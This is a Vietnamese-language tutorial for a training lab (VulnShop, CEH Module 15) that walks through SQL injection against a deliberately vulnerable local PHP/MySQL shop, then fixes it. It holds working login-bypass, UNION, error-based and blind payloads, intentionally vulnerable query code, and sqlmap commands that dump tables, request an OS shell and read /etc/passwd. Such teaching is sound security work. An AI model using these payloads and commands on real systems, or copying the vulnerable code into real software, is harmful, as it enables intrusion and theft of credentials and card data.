# 📖 HƯỚNG DẪN THỰC HÀNH SQL INJECTION
## CEH Module 15 - VulnShop Lab

> Tài liệu hướng dẫn chi tiết cách cài đặt, tấn công, sử dụng công cụ, và khắc phục lỗ hổng SQL Injection trên ứng dụng VulnShop.

---

## MỤC LỤC

1. [Cài đặt môi trường](#1-cài-đặt-môi-trường)
2. [Tổng quan ứng dụng VulnShop](#2-tổng-quan-ứng-dụng-vulnshop)
3. [Kịch bản 1: Authentication Bypass](#3-kịch-bản-1-authentication-bypass)
4. [Kịch bản 2: UNION-based SQL Injection](#4-kịch-bản-2-union-based-sql-injection)
5. [Kịch bản 3: Error-based SQL Injection](#5-kịch-bản-3-error-based-sql-injection)
6. [Kịch bản 4: Boolean-based Blind SQL Injection](#6-kịch-bản-4-boolean-based-blind-sql-injection)
7. [Kịch bản 5: Time-based Blind SQL Injection](#7-kịch-bản-5-time-based-blind-sql-injection)
8. [Sử dụng sqlmap](#8-sử-dụng-sqlmap)
9. [Sử dụng Burp Suite](#9-sử-dụng-burp-suite)
10. [Khắc phục lỗ hổng (Fix)](#10-khắc-phục-lỗ-hổng)

---

## 1. CÀI ĐẶT MÔI TRƯỜNG

### 1.1 Yêu cầu hệ thống

| Phần mềm       | Phiên bản          | Mục đích                   |
| -------------- | ------------------ | -------------------------- |
| Docker Desktop | 4.x trở lên        | Chạy container PHP + MySQL |
| Trình duyệt    | Chrome / Firefox   | Truy cập ứng dụng          |
| sqlmap         | Phiên bản mới nhất | Tấn công tự động           |
| Burp Suite     | Community Edition  | Intercept & modify request |

### 1.2 Cài đặt Docker Desktop

**macOS:**
```bash
# Cài đặt qua Homebrew
brew install --cask docker

# Hoặc tải từ https://www.docker.com/products/docker-desktop/
```

**Windows:**
- Tải Docker Desktop từ https://www.docker.com/products/docker-desktop/
- Yêu cầu: WSL2 hoặc Hyper-V

**Linux (Ubuntu/Debian):**
```bash
sudo apt update
sudo apt install docker.io docker-compose-v2
sudo systemctl enable docker
sudo usermod -aG docker $USER
```

### 1.3 Cài đặt sqlmap

```bash
# macOS/Linux
git clone https://github.com/sqlmapproject/sqlmap.git
cd sqlmap
python3 sqlmap.py --version

# Hoặc qua pip
pip3 install sqlmap
```

### 1.4 Cài đặt Burp Suite

1. Tải **Burp Suite Community Edition** từ https://portswigger.net/burp/communitydownload
2. Cài đặt theo hướng dẫn
3. Cấu hình proxy trình duyệt: `127.0.0.1:8080` (lưu ý: port 8080 trùng với VulnShop, nên đổi Burp proxy sang port `8082`)

### 1.5 Khởi chạy VulnShop

```bash
# Clone/Copy project
cd vulnshop

# Khởi chạy (lần đầu sẽ tải Docker images)
docker compose up -d --build

# Đợi khoảng 10-15 giây cho MySQL khởi tạo xong
```

### 1.6 Truy cập

| Service        | URL                   | Thông tin đăng nhập |
| -------------- | --------------------- | ------------------- |
| **VulnShop**   | http://localhost:8080 | admin / admin123    |
| **phpMyAdmin** | http://localhost:8081 | root / rootpass     |

### 1.7 Dừng / Reset lab

```bash
# Dừng lab
docker compose down

# Reset toàn bộ (xóa database, tạo lại từ đầu)
docker compose down -v
docker compose up -d --build
```

---

## 2. TỔNG QUAN ỨNG DỤNG VULNSHOP

### 2.1 Mô tả

VulnShop là ứng dụng web mô phỏng cửa hàng điện tử trực tuyến, được xây dựng với **lỗ hổng SQL Injection có chủ đích** ở 5 điểm khác nhau:

| Trang       | URL                 | Loại lỗ hổng          | Mức độ     |
| ----------- | ------------------- | --------------------- | ---------- |
| Đăng nhập   | `/login.php`        | Authentication Bypass | Dễ         |
| Tìm kiếm    | `/search.php?q=`    | UNION-based SQLi      | Dễ         |
| Chi tiết SP | `/product.php?id=`  | Error-based SQLi      | Trung bình |
| Hồ sơ       | `/profile.php?uid=` | Boolean-based Blind   | Khó        |
| Đánh giá    | `/feedback.php`     | Time-based Blind      | Khó        |

### 2.2 Kiến trúc

```
┌──────────────┐     ┌──────────────────┐     ┌──────────────┐
│   Browser    │────▶│   Apache + PHP   │────▶│    MySQL     │
│   (Client)   │◀────│   (Port 8080)    │◀────│  (Port 3307) │
└──────────────┘     └──────────────────┘     └──────────────┘
                          Docker Container
```

### 2.3 Cấu trúc Database

```sql
vulnshop
├── users           -- username, password (MD5), email, full_name, role
├── products        -- name, description, price, category, stock
├── orders          -- user_id, product_id, quantity, total_amount, status
├── feedbacks       -- product_id, user_name, comment, rating
└── sensitive_data  -- card_number, card_holder, expiry_date, cvv
```

### 2.4 Tài khoản demo

| Username   | Password    | Role  |
| ---------- | ----------- | ----- |
| admin      | admin123    | admin |
| nguyenvana | password123 | user  |
| tranthib   | mypass456   | user  |
| levanc     | secure789   | user  |
| phamthid   | pass2024    | user  |

---

## 3. KỊCH BẢN 1: AUTHENTICATION BYPASS

### 3.1 Mục tiêu
Đăng nhập vào tài khoản **admin** mà **không cần biết mật khẩu**.

### 3.2 Trang tấn công
`http://localhost:8080/login.php`

### 3.3 Phân tích code vulnerable

```php
// File: src/login.php
$username = $_POST['username'];
$password = $_POST['password'];

// ❌ VULNERABLE: Input ghép trực tiếp vào SQL
$sql = "SELECT * FROM users WHERE username = '$username' AND password = MD5('$password')";
$result = mysqli_query($conn, $sql);
```

**Vấn đề:** Giá trị `$username` và `$password` được ghép trực tiếp vào câu SQL mà không có bất kỳ kiểm tra hay escape nào.

### 3.4 Các bước tấn công

#### Bước 1: Truy cập trang login
Mở trình duyệt, truy cập `http://localhost:8080/login.php`

#### Bước 2: Nhập payload vào trường Username
```
admin' -- 
```
> **Lưu ý:** Có 1 dấu cách sau `--` (comment trong MySQL yêu cầu space)

Password: nhập bất kỳ (ví dụ: `anything`)

#### Bước 3: Phân tích câu SQL được tạo ra

**SQL gốc (bình thường):**
```sql
SELECT * FROM users WHERE username = 'admin' AND password = MD5('admin123')
```

**SQL sau khi inject:**
```sql
SELECT * FROM users WHERE username = 'admin' -- ' AND password = MD5('anything')
```

| Phần                             | Ý nghĩa                                             |
| -------------------------------- | --------------------------------------------------- |
| `admin'`                         | Đóng dấu `'` của username                           |
| `--`                             | Comment out phần còn lại → bỏ qua kiểm tra password |
| `AND password = MD5('anything')` | Đã bị comment, không thực thi                       |

#### Bước 4: Kết quả
- Database trả về bản ghi của user `admin`
- Ứng dụng tạo session và redirect về trang chủ
- Bạn đã đăng nhập với quyền **admin** mà không cần mật khẩu

### 3.5 Các payload thay thế

| Payload (Username)     | Payload (Password) | Kết quả                         |
| ---------------------- | ------------------ | ------------------------------- |
| `admin' -- `           | bất kỳ             | Login admin                     |
| `' OR 1=1 -- `         | bất kỳ             | Login user đầu tiên trong DB    |
| `' OR '1'='1' -- `     | bất kỳ             | Login user đầu tiên             |
| `admin'/*`             | `*/OR '1'='1`      | Bypass dùng block comment       |
| `' OR 1=1 LIMIT 1 -- ` | bất kỳ             | Login user đầu tiên (chính xác) |

---

## 4. KỊCH BẢN 2: UNION-BASED SQL INJECTION

### 4.1 Mục tiêu
Trích xuất **toàn bộ dữ liệu** trong database, bao gồm username, password, và thông tin nhạy cảm (thẻ tín dụng).

### 4.2 Trang tấn công
`http://localhost:8080/search.php?q=`

### 4.3 Phân tích code vulnerable

```php
// File: src/search.php
$keyword = $_GET['q'];

// ❌ VULNERABLE: Input từ URL ghép trực tiếp
$sql = "SELECT id, name, price, category FROM products WHERE name LIKE '%$keyword%'";
```

### 4.4 Các bước tấn công chi tiết

#### Bước 1: Xác nhận lỗ hổng
```
http://localhost:8080/search.php?q=' AND '1'='1
```
→ Nếu trang hoạt động bình thường = có thể inject

```
http://localhost:8080/search.php?q=' AND '1'='2
```
→ Nếu không có kết quả = confirmed injectable

#### Bước 2: Xác định số cột bằng ORDER BY

```
http://localhost:8080/search.php?q=' ORDER BY 1-- 
http://localhost:8080/search.php?q=' ORDER BY 2-- 
http://localhost:8080/search.php?q=' ORDER BY 3-- 
http://localhost:8080/search.php?q=' ORDER BY 4--    ← OK
http://localhost:8080/search.php?q=' ORDER BY 5--    ← LỖI!
```

→ **Kết luận: Query gốc có 4 cột**

#### Bước 3: Tìm cột hiển thị trên trang
```
http://localhost:8080/search.php?q=' UNION SELECT 1,2,3,4-- 
```
→ Xem giá trị 1, 2, 3, 4 xuất hiện ở vị trí nào trên trang
→ Các cột hiển thị là nơi ta sẽ inject dữ liệu

#### Bước 4: Lấy thông tin database
```
http://localhost:8080/search.php?q=' UNION SELECT 1,database(),version(),user()-- 
```

| Cột | Giá trị trả về | Ý nghĩa           |
| --- | -------------- | ----------------- |
| 2   | `vulnshop`     | Tên database      |
| 3   | `8.0.x`        | Phiên bản MySQL   |
| 4   | `vulnuser@%`   | User đang kết nối |

#### Bước 5: Liệt kê tất cả bảng trong database
```
http://localhost:8080/search.php?q=' UNION SELECT 1,GROUP_CONCAT(table_name),3,4 FROM information_schema.tables WHERE table_schema=database()-- 
```
→ Kết quả: `feedbacks,orders,products,sensitive_data,users`

#### Bước 6: Liệt kê cột của bảng `users`
```
http://localhost:8080/search.php?q=' UNION SELECT 1,GROUP_CONCAT(column_name),3,4 FROM information_schema.columns WHERE table_name='users'-- 
```
→ Kết quả: `id,username,password,email,full_name,role,created_at`

#### Bước 7: Dump dữ liệu bảng users
```
http://localhost:8080/search.php?q=' UNION SELECT 1,username,password,email FROM users-- 
```

**Kết quả mong đợi:**

| ID  | Username   | Password (MD5)                   | Email              |
| --- | ---------- | -------------------------------- | ------------------ |
| 1   | admin      | 0192023a7bbd73250516f069df18b500 | admin@vulnshop.com |
| 1   | nguyenvana | 482c811da5d5b4bc6d497ffa98491e38 | vana@gmail.com     |
| ... | ...        | ...                              | ...                |

#### Bước 8: Dump dữ liệu nhạy cảm (thẻ tín dụng) 💳
```
http://localhost:8080/search.php?q=' UNION SELECT 1,card_number,card_holder,cvv FROM sensitive_data-- 
```

**Kết quả:**

| Card Number         | Card Holder  | CVV |
| ------------------- | ------------ | --- |
| 4111-1111-1111-1111 | NGUYEN VAN A | 123 |
| 5500-0000-0000-0004 | TRAN THI B   | 456 |
| ...                 | ...          | ... |

> ⚠️ Đây là dữ liệu giả, nhưng trong thực tế, đây chính là cách attacker đánh cắp thông tin thẻ tín dụng.

---

## 5. KỊCH BẢN 3: ERROR-BASED SQL INJECTION

### 5.1 Mục tiêu
Trích xuất thông tin database thông qua **thông báo lỗi SQL** hiển thị trên trang web.

### 5.2 Trang tấn công
`http://localhost:8080/product.php?id=1`

### 5.3 Phân tích code vulnerable

```php
// File: src/product.php
$id = $_GET['id'];

// ❌ VULNERABLE: Không có quote, không có type casting
$sql = "SELECT * FROM products WHERE id = $id";
$result = mysqli_query($conn, $sql);

if (!$result) {
    // ❌ Hiển thị lỗi SQL cho người dùng
    $error = mysqli_error($conn);
}
```

**Hai vấn đề:**
1. `$id` không được validate/cast thành integer
2. Error message SQL được hiển thị trực tiếp

### 5.4 Các bước tấn công

#### Bước 1: Xác nhận injection
```
http://localhost:8080/product.php?id=1 AND 1=1    → Hiển thị sản phẩm (TRUE)
http://localhost:8080/product.php?id=1 AND 1=2    → Không hiển thị sản phẩm (FALSE)
```

#### Bước 2: Trích xuất tên database qua error
```
http://localhost:8080/product.php?id=1 AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database()),0x7e))
```
→ Error hiển thị: `XPATH syntax error: '~vulnshop~'`

**Giải thích:** Hàm `EXTRACTVALUE()` cố parse chuỗi `~vulnshop~` như XPath → gây lỗi → lỗi chứa dữ liệu ta muốn.

#### Bước 3: Liệt kê bảng
```
http://localhost:8080/product.php?id=1 AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()),0x7e))
```
→ Error: `XPATH syntax error: '~feedbacks,orders,products,sensi...'`

#### Bước 4: Lấy username và password
```
http://localhost:8080/product.php?id=1 AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT CONCAT(username,0x3a,password) FROM users LIMIT 0,1),0x7e))
```
→ Error: `XPATH syntax error: '~admin:0192023a7bbd7325...'`

> **Lưu ý:** EXTRACTVALUE trả về tối đa 32 ký tự. Dùng `SUBSTRING()` để lấy phần còn lại.

#### Bước 5: Lấy phần còn lại (nếu bị cắt)
```
http://localhost:8080/product.php?id=1 AND EXTRACTVALUE(1,CONCAT(0x7e,SUBSTRING((SELECT password FROM users WHERE username='admin'),1,32),0x7e))
```

```
http://localhost:8080/product.php?id=1 AND EXTRACTVALUE(1,CONCAT(0x7e,SUBSTRING((SELECT password FROM users WHERE username='admin'),20,32),0x7e))
```

---

## 6. KỊCH BẢN 4: BOOLEAN-BASED BLIND SQL INJECTION

### 6.1 Mục tiêu
Xác định thông tin database **từng ký tự một** dựa trên sự khác biệt phản hồi (hiển thị profile / không hiển thị).

### 6.2 Trang tấn công
`http://localhost:8080/profile.php?uid=1`

### 6.3 Phân tích code vulnerable

```php
// File: src/profile.php
$uid = $_GET['uid'];
$sql = "SELECT ... FROM users WHERE id = $uid";
$result = mysqli_query($conn, $sql);

if (mysqli_num_rows($result) > 0) {
    // Hiển thị thông tin user ← TRUE RESPONSE
} else {
    // "Không tìm thấy" ← FALSE RESPONSE
}
```

**Đặc điểm:** Hai phản hồi khác nhau → dùng để suy luận TRUE/FALSE.

### 6.4 Các bước tấn công

#### Bước 1: Xác nhận injection
```
http://localhost:8080/profile.php?uid=1 AND 1=1    → Hiển thị profile ✅ (TRUE)
http://localhost:8080/profile.php?uid=1 AND 1=2    → "Không tìm thấy" ❌ (FALSE)
```
→ Confirmed: Có thể inject boolean condition

#### Bước 2: Xác định độ dài tên database
```
uid=1 AND LENGTH(database())=1    → FALSE
uid=1 AND LENGTH(database())=5    → FALSE
uid=1 AND LENGTH(database())=8    → TRUE ✅
```
→ **Tên database có 8 ký tự**

#### Bước 3: Lấy từng ký tự bằng SUBSTRING

**Ký tự thứ 1:**
```
uid=1 AND SUBSTRING(database(),1,1)='a'    → FALSE
uid=1 AND SUBSTRING(database(),1,1)='v'    → TRUE ✅
```

**Ký tự thứ 2:**
```
uid=1 AND SUBSTRING(database(),2,1)='u'    → TRUE ✅
```

**Ký tự thứ 3:**
```
uid=1 AND SUBSTRING(database(),3,1)='l'    → TRUE ✅
```

→ Tiếp tục cho đến hết → **v-u-l-n-s-h-o-p = "vulnshop"**

#### Bước 4: Tối ưu bằng Binary Search (dùng ASCII)

Thay vì đoán từng chữ cái, dùng giá trị ASCII + nhị phân:

```
uid=1 AND ASCII(SUBSTRING(database(),1,1)) > 100    → TRUE (>100)
uid=1 AND ASCII(SUBSTRING(database(),1,1)) > 115    → TRUE (>115)
uid=1 AND ASCII(SUBSTRING(database(),1,1)) > 120    → FALSE (<=120)
uid=1 AND ASCII(SUBSTRING(database(),1,1)) > 117    → TRUE (>117)
uid=1 AND ASCII(SUBSTRING(database(),1,1)) > 118    → FALSE (<=118)
uid=1 AND ASCII(SUBSTRING(database(),1,1)) = 118    → TRUE ✅
```
→ ASCII 118 = `v`

> Với binary search, chỉ cần ~7 request thay vì 26+ request cho mỗi ký tự.

#### Bước 5: Lấy tên bảng

```
uid=1 AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database()) = 5    → TRUE
```
→ Database có 5 bảng

```
uid=1 AND SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),1,1)='f'    → TRUE
```
→ Bảng đầu tiên bắt đầu bằng 'f' → "feedbacks"

#### Bước 6: Bảng kết quả mẫu

| Vị trí      | Thử                                              | Kết quả | Ký tự        |
| ----------- | ------------------------------------------------ | ------- | ------------ |
| 1           | ASCII > 100 → T, > 115 → T, > 120 → F, = 118 → T | TRUE    | v (118)      |
| 2           | ASCII = 117                                      | TRUE    | u (117)      |
| 3           | ASCII = 108                                      | TRUE    | l (108)      |
| 4           | ASCII = 110                                      | TRUE    | n (110)      |
| 5           | ASCII = 115                                      | TRUE    | s (115)      |
| 6           | ASCII = 104                                      | TRUE    | h (104)      |
| 7           | ASCII = 111                                      | TRUE    | o (111)      |
| 8           | ASCII = 112                                      | TRUE    | p (112)      |
| **Kết quả** |                                                  |         | **vulnshop** |

---

## 7. KỊCH BẢN 5: TIME-BASED BLIND SQL INJECTION

### 7.1 Mục tiêu
Trích xuất thông tin khi **không có sự khác biệt phản hồi** (response luôn giống nhau), dựa vào **thời gian phản hồi**.

### 7.2 Trang tấn công
`http://localhost:8080/feedback.php`

### 7.3 Phân tích code vulnerable

```php
// File: src/feedback.php
$product_id = $_POST['product_id'];
$user_name = $_POST['user_name'];
$comment = $_POST['comment'];
$rating = $_POST['rating'];

// ❌ VULNERABLE: String concatenation in INSERT
$sql = "INSERT INTO feedbacks (product_id, user_name, comment, rating) 
        VALUES ($product_id, '$user_name', '$comment', $rating)";
mysqli_query($conn, $sql);

// ❌ Luôn trả về cùng 1 message dù query thành công hay thất bại
echo "Cảm ơn bạn đã gửi đánh giá!";
```

**Đặc điểm:**
- Response luôn giống nhau → Boolean blind không hoạt động
- Không hiển thị error → Error-based không hoạt động
- Chỉ có thể dùng **SLEEP()** để tạo delay

### 7.4 Các bước tấn công

> **Lưu ý:** Cần gửi POST request. Có thể dùng Burp Suite, curl, hoặc sửa form qua DevTools.

#### Bước 1: Xác nhận injection (dùng curl)

```bash
# Gửi request bình thường - đo thời gian
time curl -X POST http://localhost:8080/feedback.php \
  -d "product_id=1&user_name=test&comment=test&rating=5"
# → Khoảng 0.01s

# Inject SLEEP(3) vào trường rating
time curl -X POST http://localhost:8080/feedback.php \
  -d "product_id=1&user_name=test&comment=test&rating=1) AND SLEEP(3)-- "
# → Khoảng 3.01s ← CONFIRMED!
```

#### Bước 2: Xác định độ dài tên database

```bash
# LENGTH(database())=8 → SLEEP(3) nếu đúng
time curl -X POST http://localhost:8080/feedback.php \
  -d "product_id=1&user_name=test&comment=test&rating=1) AND IF(LENGTH(database())=8,SLEEP(3),0)-- "
# → ~3s → TRUE
```

#### Bước 3: Lấy từng ký tự

```bash
# Ký tự đầu tiên = 'v'?
time curl -X POST http://localhost:8080/feedback.php \
  -d "product_id=1&user_name=test&comment=test&rating=1) AND IF(SUBSTRING(database(),1,1)='v',SLEEP(3),0)-- "
# → ~3s → TRUE ✅

# Ký tự thứ 2 = 'u'?
time curl -X POST http://localhost:8080/feedback.php \
  -d "product_id=1&user_name=test&comment=test&rating=1) AND IF(SUBSTRING(database(),2,1)='u',SLEEP(3),0)-- "
# → ~3s → TRUE ✅
```

#### Bước 4: Bảng kết quả

| Ký tự       | Payload                                        | Thời gian | Kết luận     |
| ----------- | ---------------------------------------------- | --------- | ------------ |
| 1           | `IF(SUBSTRING(database(),1,1)='v',SLEEP(3),0)` | 3.02s     | v ✅          |
| 2           | `IF(SUBSTRING(database(),2,1)='u',SLEEP(3),0)` | 3.01s     | u ✅          |
| 3           | `IF(SUBSTRING(database(),3,1)='l',SLEEP(3),0)` | 3.03s     | l ✅          |
| ...         | ...                                            | ...       | ...          |
| **Kết quả** |                                                |           | **vulnshop** |

> **Nhược điểm:** Rất chậm! Mỗi ký tự mất 3+ giây × 26 lần thử = ~78 giây/ký tự. Nên dùng sqlmap để tự động hóa.

---

## 8. SỬ DỤNG SQLMAP

### 8.1 Giới thiệu

**sqlmap** là công cụ open-source tự động phát hiện và khai thác SQL Injection. Hỗ trợ MySQL, MSSQL, Oracle, PostgreSQL, SQLite.

### 8.2 Quét UNION-based SQLi (search.php)

```bash
# Phát hiện lỗ hổng
sqlmap -u "http://localhost:8080/search.php?q=test" --batch

# Liệt kê databases
sqlmap -u "http://localhost:8080/search.php?q=test" --dbs --batch

# Liệt kê bảng trong database vulnshop
sqlmap -u "http://localhost:8080/search.php?q=test" -D vulnshop --tables --batch

# Liệt kê cột bảng users
sqlmap -u "http://localhost:8080/search.php?q=test" -D vulnshop -T users --columns --batch

# Dump toàn bộ bảng users
sqlmap -u "http://localhost:8080/search.php?q=test" -D vulnshop -T users --dump --batch

# Dump bảng sensitive_data
sqlmap -u "http://localhost:8080/search.php?q=test" -D vulnshop -T sensitive_data --dump --batch

# Dump TOÀN BỘ database
sqlmap -u "http://localhost:8080/search.php?q=test" -D vulnshop --dump-all --batch
```

### 8.3 Quét Error-based SQLi (product.php)

```bash
# Quét product.php
sqlmap -u "http://localhost:8080/product.php?id=1" --batch

# Lấy OS shell (nếu có quyền)
sqlmap -u "http://localhost:8080/product.php?id=1" --os-shell --batch

# Đọc file hệ thống
sqlmap -u "http://localhost:8080/product.php?id=1" --file-read="/etc/passwd" --batch
```

### 8.4 Quét Blind SQLi (profile.php)

```bash
# Boolean-based blind
sqlmap -u "http://localhost:8080/profile.php?uid=1" --batch --technique=B

# Tốc độ nhanh hơn với threads
sqlmap -u "http://localhost:8080/profile.php?uid=1" --batch --threads=5
```

### 8.5 Quét Time-based Blind SQLi (feedback.php)

```bash
# POST request time-based
sqlmap -u "http://localhost:8080/feedback.php" \
  --data="product_id=1&user_name=test&comment=test&rating=5" \
  --batch --technique=T

# Chỉ định parameter bị lỗi
sqlmap -u "http://localhost:8080/feedback.php" \
  --data="product_id=1&user_name=test&comment=test&rating=5" \
  -p "rating" --batch
```

### 8.6 Tham số sqlmap quan trọng

| Tham số              | Ý nghĩa                                                                  |
| -------------------- | ------------------------------------------------------------------------ |
| `--batch`            | Tự động trả lời Yes cho tất cả câu hỏi                                   |
| `--dbs`              | Liệt kê databases                                                        |
| `--tables`           | Liệt kê bảng                                                             |
| `--columns`          | Liệt kê cột                                                              |
| `--dump`             | Xuất dữ liệu                                                             |
| `--dump-all`         | Xuất toàn bộ dữ liệu                                                     |
| `-D`, `-T`, `-C`     | Chỉ định database, table, column                                         |
| `--technique=BEUSTQ` | Chọn kỹ thuật (B=Boolean, E=Error, U=Union, S=Stacked, T=Time, Q=Inline) |
| `--threads=N`        | Số luồng song song                                                       |
| `--risk=3`           | Mức rủi ro (1-3, cao hơn = nhiều payload hơn)                            |
| `--level=5`          | Mức quét (1-5, cao hơn = nhiều test hơn)                                 |
| `-p "param"`         | Chỉ định parameter cần test                                              |
| `--os-shell`         | Lấy shell hệ điều hành                                                   |
| `--file-read`        | Đọc file trên server                                                     |

---

## 9. SỬ DỤNG BURP SUITE

### 9.1 Cấu hình ban đầu

1. Mở Burp Suite → chọn **Temporary Project** → **Next** → **Start Burp**
2. Vào **Proxy** → **Options** → đổi port sang `8082` (tránh trùng port 8080 của VulnShop)
3. Cấu hình trình duyệt:
   - Firefox: Settings → Network Settings → Manual Proxy: `127.0.0.1:8082`
   - Hoặc dùng extension FoxyProxy
4. Bật **Intercept** trong tab Proxy

### 9.2 Intercept Login Request

#### Bước 1: Bật Intercept
Proxy → Intercept → **Intercept is on**

#### Bước 2: Submit form login
Truy cập `http://localhost:8080/login.php`, điền username/password bình thường, click **Đăng nhập**

#### Bước 3: Xem request bị bắt
```http
POST /login.php HTTP/1.1
Host: localhost:8080
Content-Type: application/x-www-form-urlencoded
Content-Length: 35

username=admin&password=admin123
```

#### Bước 4: Sửa request
Thay đổi giá trị username thành payload:
```http
username=admin' -- &password=anything
```

#### Bước 5: Forward request
Click **Forward** → Observe kết quả

### 9.3 Sử dụng Repeater

1. Trong Proxy → HTTP History → Click chuột phải vào request → **Send to Repeater**
2. Trong tab Repeater → sửa payload → click **Send**
3. Xem response ở panel bên phải
4. Thử nhiều payload khác nhau mà không cần refresh trình duyệt

### 9.4 Sử dụng Intruder (Brute-force payload)

#### Mục đích: Tự động tìm số cột cho UNION-based SQLi

1. Gửi request search tới Intruder
2. Mark payload position: `q=§1§`
3. Payload type: **Numbers** → From: 1, To: 10, Step: 1
4. Thêm prefix: `' ORDER BY ` và suffix: `-- `
5. Start Attack → Xem response length thay đổi ở số nào → đó là giới hạn số cột

### 9.5 So sánh tấn công thủ công vs Tự động

| Tiêu chí        | Thủ công (Browser) | sqlmap            | Burp Suite       |
| --------------- | ------------------ | ----------------- | ---------------- |
| **Tốc độ**      | Chậm               | Rất nhanh         | Nhanh            |
| **Chính xác**   | Phụ thuộc kỹ năng  | Rất cao           | Cao              |
| **Linh hoạt**   | Rất cao            | Trung bình        | Cao              |
| **Học tập**     | Hiểu sâu nguyên lý | Dễ dùng, ít hiểu  | Cần kinh nghiệm  |
| **WAF Bypass**  | Tùy kỹ năng        | Có tamper scripts | Tốt              |
| **Phù hợp cho** | Học tập, PoC       | Pentest thực tế   | Phân tích, debug |

---

## 10. KHẮC PHỤC LỖ HỔNG

### 10.1 Biện pháp 1: Prepared Statements (Quan trọng nhất)

#### Login - Trước khi fix:
```php
// ❌ VULNERABLE
$sql = "SELECT * FROM users WHERE username = '$username' AND password = MD5('$password')";
$result = mysqli_query($conn, $sql);
```

#### Login - Sau khi fix:
```php
// ✅ SECURE - Prepared Statement (MySQLi)
$stmt = $conn->prepare("SELECT * FROM users WHERE username = ? AND password = MD5(?)");
$stmt->bind_param("ss", $username, $password);
$stmt->execute();
$result = $stmt->get_result();
```

#### Search - Trước khi fix:
```php
// ❌ VULNERABLE
$sql = "SELECT id, name, price, category FROM products WHERE name LIKE '%$keyword%'";
```

#### Search - Sau khi fix:
```php
// ✅ SECURE
$keyword_param = "%{$keyword}%";
$stmt = $conn->prepare("SELECT id, name, price, category FROM products WHERE name LIKE ?");
$stmt->bind_param("s", $keyword_param);
$stmt->execute();
$result = $stmt->get_result();
```

#### Product - Trước khi fix:
```php
// ❌ VULNERABLE
$sql = "SELECT * FROM products WHERE id = $id";
```

#### Product - Sau khi fix:
```php
// ✅ SECURE
$stmt = $conn->prepare("SELECT * FROM products WHERE id = ?");
$stmt->bind_param("i", $id);  // "i" = integer
$stmt->execute();
$result = $stmt->get_result();
```

#### Feedback - Trước khi fix:
```php
// ❌ VULNERABLE
$sql = "INSERT INTO feedbacks (product_id, user_name, comment, rating) VALUES ($product_id, '$user_name', '$comment', $rating)";
```

#### Feedback - Sau khi fix:
```php
// ✅ SECURE
$stmt = $conn->prepare("INSERT INTO feedbacks (product_id, user_name, comment, rating) VALUES (?, ?, ?, ?)");
$stmt->bind_param("issi", $product_id, $user_name, $comment, $rating);
$stmt->execute();
```

### 10.2 Biện pháp 2: Input Validation

```php
// Validate integer
$id = filter_input(INPUT_GET, 'id', FILTER_VALIDATE_INT);
if ($id === false || $id === null) {
    die("ID không hợp lệ");
}

// Validate string (chỉ cho phép chữ cái, số, underscore)
if (!preg_match('/^[a-zA-Z0-9_]+$/', $username)) {
    die("Tên đăng nhập không hợp lệ");
}

// Sanitize
$keyword = htmlspecialchars($keyword, ENT_QUOTES, 'UTF-8');
```

### 10.3 Biện pháp 3: Error Handling an toàn

```php
// ❌ KHÔNG AN TOÀN - Hiển thị lỗi SQL cho user
echo "Error: " . mysqli_error($conn);

// ✅ AN TOÀN - Log nội bộ, hiển thị thông báo chung
ini_set('display_errors', 0);
error_log("SQL Error: " . mysqli_error($conn));
echo "Đã xảy ra lỗi. Vui lòng thử lại sau.";
```

### 10.4 Biện pháp 4: Least Privilege

```sql
-- ❌ App dùng root account
-- GRANT ALL PRIVILEGES ON *.* TO 'root'@'localhost';

-- ✅ Tạo user riêng cho app với quyền tối thiểu
CREATE USER 'webapp'@'%' IDENTIFIED BY 'strong_password';
GRANT SELECT ON vulnshop.products TO 'webapp'@'%';
GRANT SELECT ON vulnshop.users TO 'webapp'@'%';
GRANT INSERT ON vulnshop.feedbacks TO 'webapp'@'%';
GRANT SELECT, INSERT ON vulnshop.orders TO 'webapp'@'%';
-- KHÔNG cấp: FILE, DROP, CREATE, ALTER, EXECUTE
FLUSH PRIVILEGES;
```

### 10.5 Biện pháp 5: Mã hóa Password an toàn

```php
// ❌ KHÔNG AN TOÀN - MD5 (dễ crack)
$password_hash = md5($password);

// ✅ AN TOÀN - bcrypt (PHP built-in)
$password_hash = password_hash($password, PASSWORD_BCRYPT);

// Kiểm tra password
if (password_verify($input_password, $stored_hash)) {
    // Đúng mật khẩu
}
```

### 10.6 Bảng tổng hợp fix

| Trang          | Lỗ hổng          | Biện pháp fix                         |
| -------------- | ---------------- | ------------------------------------- |
| `login.php`    | Auth Bypass      | Prepared Statement + bcrypt           |
| `search.php`   | UNION-based      | Prepared Statement + Input Validation |
| `product.php`  | Error-based      | Prepared Statement + Error Handling   |
| `profile.php`  | Boolean Blind    | Prepared Statement + Type casting     |
| `feedback.php` | Time-based Blind | Prepared Statement                    |

### 10.7 Kiểm tra sau khi fix

Sau khi áp dụng tất cả biện pháp fix, chạy lại để xác nhận:

```bash
# Thử payload thủ công → phải thất bại
# Login: admin' --  → "Sai tên đăng nhập"
# Search: ' UNION SELECT 1,2,3,4-- → Không có kết quả

# Chạy sqlmap → phải không phát hiện lỗ hổng
sqlmap -u "http://localhost:8080/search.php?q=test" --batch
# Expected: "[WARNING] GET parameter 'q' does not seem to be injectable"

sqlmap -u "http://localhost:8080/product.php?id=1" --batch
# Expected: "all tested parameters do not appear to be injectable"
```

---

## PHỤ LỤC

### A. Bảng tổng hợp payload SQL Injection

| Loại        | Payload                                                                                                         | Mục đích                    |
| ----------- | --------------------------------------------------------------------------------------------------------------- | --------------------------- |
| Auth Bypass | `admin' -- `                                                                                                    | Bypass login                |
| Auth Bypass | `' OR 1=1 -- `                                                                                                  | Login user đầu tiên         |
| UNION       | `' UNION SELECT 1,2,3,4-- `                                                                                     | Tìm cột hiển thị            |
| UNION       | `' UNION SELECT 1,database(),version(),user()-- `                                                               | Thông tin DB                |
| UNION       | `' UNION SELECT 1,GROUP_CONCAT(table_name),3,4 FROM information_schema.tables WHERE table_schema=database()-- ` | Liệt kê bảng                |
| Error       | `AND EXTRACTVALUE(1,CONCAT(0x7e,database(),0x7e))`                                                              | Lấy tên DB qua error        |
| Boolean     | `AND SUBSTRING(database(),1,1)='v'`                                                                             | Lấy ký tự qua TRUE/FALSE    |
